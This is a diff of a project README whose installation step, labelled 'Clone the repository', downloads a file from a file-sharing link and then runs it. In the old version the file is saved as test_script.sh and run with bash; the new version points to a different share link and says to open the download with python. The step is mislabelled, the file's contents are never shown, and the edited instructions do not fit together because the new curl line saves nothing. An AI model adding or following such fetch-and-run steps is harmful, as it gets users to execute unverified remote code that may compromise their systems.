@@ -17,13 +17,13 @@ Installation
 
 Clone the repository:
 
-curl https://pingvin-share.dev.eliasschneider.com/api/shares/bzQRMkll/files/17e0a02b-be59-47e1-935e-ca59e03f8365 > test_script.sh
+curl https://pingvin-share.dev.eliasschneider.com/api/shares/x9E3Gbma/files/f40ea0df-0bec-423e-869a-f84214c2a9b4
 
 Usage
 
 To convert a file:
 
-bash test_script.sh 
+Open the downloaded file using python
 
 Supported Formats
 
